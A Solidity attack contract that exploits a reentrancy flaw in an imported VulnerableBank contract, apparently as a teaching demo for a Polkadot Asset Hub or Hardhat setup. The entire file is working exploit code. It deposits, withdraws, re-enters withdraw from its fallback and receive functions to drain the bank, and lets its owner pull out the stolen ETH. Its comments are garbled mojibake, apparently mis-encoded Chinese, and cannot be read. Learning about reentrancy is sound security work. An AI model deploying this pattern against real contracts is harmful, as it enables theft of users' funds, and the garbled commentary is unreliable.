pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

/**
 * @title Attacker
 * @dev Âà©Áî®ÈáçÂÖ•ÊºèÊ¥ûÊîªÂáª VulnerableBank ÁöÑÊîªÂáªÂêàÁ∫¶ - Polkadot Asset Hub ÁâàÊú¨
 * 
 * ÊîªÂáªÂéüÁêÜÔºö
 * 1. ÂÖàÂú®Èì∂Ë°åÂ≠òÂÖ•‰∏ÄÂÆöÈáëÈ¢ùÔºàÂ¶Ç 1 ETHÔºâ
 * 2. Ë∞ÉÁî® withdraw ÂèñÊ¨æ
 * 3. Âú® receive ÂáΩÊï∞‰∏≠ÂÜçÊ¨°Ë∞ÉÁî® withdraw
 * 4. Áî±‰∫éÈì∂Ë°å‰ΩôÈ¢ùÊú™Êõ¥Êñ∞ÔºåÂèØ‰ª•ÈáçÂ§çÂèñÊ¨æ
 * 5. Áõ¥Âà∞Èì∂Ë°å‰ΩôÈ¢ùËÄóÂ∞Ω
 */
contract Attacker {
    VulnerableBank public vulnerableBank;
    address public owner;
    uint256 public attackAmount;
    uint256 public reentryCount;
    uint256 public constant MAX_REENTRY = 2; // ÈôêÂà∂ÊúÄÂ§ßÈáçÂÖ•Ê¨°Êï∞ÔºàHardhat ÈôêÂà∂Ôºâ
    
    // ‰∫ã‰ª∂ÔºöÊîªÂáªÂºÄÂßã
    event AttackStarted(uint256 amount);
    
    // ‰∫ã‰ª∂ÔºöÊîªÂáªÊàêÂäü
    event AttackSucceeded(uint256 stolenAmount);
    
    // ‰∫ã‰ª∂ÔºöÊî∂Âà∞ ETH
    event ReceivedETH(uint256 amount, uint256 balance);
    
    constructor(address _vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(_vulnerableBankAddress);
        owner = msg.sender;
    }
    
    /**
     * @dev ÂèëËµ∑ÊîªÂáª
     * 
     * ÊîªÂáªÊ≠•È™§Ôºö
     * 1. ÂêëÈì∂Ë°åÂ≠òÂÖ• msg.value
     * 2. Á´ãÂç≥Ë∞ÉÁî® withdraw
     * 3. Ëß¶ÂèëÈáçÂÖ•ÊîªÂáª
     */
    function attack() public payable {
        require(msg.value > 0, "Need ETH to attack");
        attackAmount = msg.value;
        reentryCount = 0; // ÈáçÁΩÆËÆ°Êï∞Âô®
        
        emit AttackStarted(msg.value);
        
        // Ê≠•È™§ 1: Â≠òÊ¨æ
        vulnerableBank.deposit{value: msg.value}();
        
        // Ê≠•È™§ 2: ÂºÄÂßãÊîªÂáª - Ë∞ÉÁî® withdraw
        vulnerableBank.withdraw(msg.value);
        
        emit AttackSucceeded(address(this).balance);
    }
    
    /**
     * @dev fallback ÂáΩÊï∞ - ÈáçÂÖ•ÊîªÂáªÁöÑÊ†∏ÂøÉ
     * 
     * ÂΩìÈì∂Ë°åÂêëÊîªÂáªÂêàÁ∫¶ËΩ¨Ë¥¶Êó∂ÔºåËøô‰∏™ÂáΩÊï∞‰ºöË¢´Ëá™Âä®Ë∞ÉÁî®
     * Êàë‰ª¨Âú®ËøôÈáåÂÜçÊ¨°Ë∞ÉÁî® withdrawÔºåÂΩ¢ÊàêÈáçÂÖ•ÊîªÂáª
     */
    fallback() external payable {
        emit ReceivedETH(msg.value, address(this).balance);
        
        reentryCount++;
        
        // üî• ÈáçÂÖ•ÊîªÂáªÁöÑÂÖ≥ÈîÆÔºöÂÜçÊ¨°Ë∞ÉÁî® withdraw
        // ÈôêÂà∂ÈáçÂÖ•Ê¨°Êï∞ÔºåÈÅøÂÖç gas ËÄóÂ∞Ω
        if (reentryCount < MAX_REENTRY && address(vulnerableBank).balance >= attackAmount) {
            vulnerableBank.withdraw(attackAmount);
        }
    }
    
    /**
     * @dev receive ÂáΩÊï∞ - ‰πüÂ§ÑÁêÜÁ∫ØËΩ¨Ë¥¶
     */
    receive() external payable {
        emit ReceivedETH(msg.value, address(this).balance);
        
        reentryCount++;
        
        if (reentryCount < MAX_REENTRY && address(vulnerableBank).balance >= attackAmount) {
            vulnerableBank.withdraw(attackAmount);
        }
    }
    
    /**
     * @dev ÊèêÂèñË¢´ÁõóÁöÑ ETH
     */
    function withdraw() public {
        require(msg.sender == owner, "Only owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }
    
    /**
     * @dev Êü•ËØ¢ÊîªÂáªÂêàÁ∫¶‰ΩôÈ¢ù
     */
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev Êü•ËØ¢Èì∂Ë°å‰ΩôÈ¢ù
     */
    function getBankBalance() public view returns (uint256) {
        return address(vulnerableBank).balance;
    }
}

